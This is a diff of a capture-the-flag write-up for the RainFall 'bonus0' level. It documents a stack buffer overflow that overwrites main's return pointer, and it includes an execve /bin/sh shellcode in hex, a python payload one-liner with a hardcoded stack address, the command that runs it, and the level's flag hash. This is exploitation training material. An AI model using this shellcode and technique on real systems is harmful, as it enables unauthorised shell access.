@@ -1,5 +1,7 @@
 bonus0:f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 
+# Reconnaissance 
+
 ```
 bonus0@RainFall:~$ ltrace ./bonus0 
 __libc_start_main(0x80485a4, 1, 0xbffff7e4, 0x80485d0, 0x8048640 <unfinished ...>
@@ -22,14 +24,13 @@ puts("AAAA BBBB"AAAA BBBB
 +++ exited (status 0) +++
 ```
 
-host ip => `10.12.3.6`
-
 ask for 2 input => read 4096 bytes
 copy 20 first bytes to `0xbffff6c8` for the first input and to `0xbffff6dc` for the second
-address buffer 4096 in p = `0xbfffe680`
 address main buffer = `0xbffff736`
 
 found 2 functions => `p` and `pp`
+
+# Test
 
 first input => 20 * "A"
 second input => 19 * "B" + "\n"
@@ -73,10 +74,10 @@ pwndbg> x/16x 0xff963ed6
 0xff963f06:     0x42424242      0x42424242      0x00424242      0x3fb40000
 ```
 
-5 last bytes are at the return pointer
+We find out that we can overwrite the return pointer of main: 5 last bytes are at the return pointer
 
 payload => 
-    first input: 20 first bytes of shellcode + padding to fill up the buffer
+    first input: 20 first bytes of shellcode + padding to fill up the buffer + newline
 `\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89`
     second input: 19 bytes (remaining bytes for shellcode + padding (8 bytes) + address main buffer + 1)
 `\xc2\x6a\x0b\x58\xcd\x80` + 8 * "C" + 4 bytes address + random char
@@ -88,3 +89,5 @@ shellcode => `\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x
 payload template => `python2 -c 'print "A" * 4091 + "XXXX\x0a" + 14 * "C" + "BBBBD"' > payload`
 
 payload => `python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89" + "A" * 4075 + "\x0a" + "\xc2\x6a\x0b\x58\xcd\x80" + 8 * "C" + "\x36\xf7\xff\xbf" + "D"' > /tmp/payload`
+
+`cat /tmp/payload - | ./bonus0`
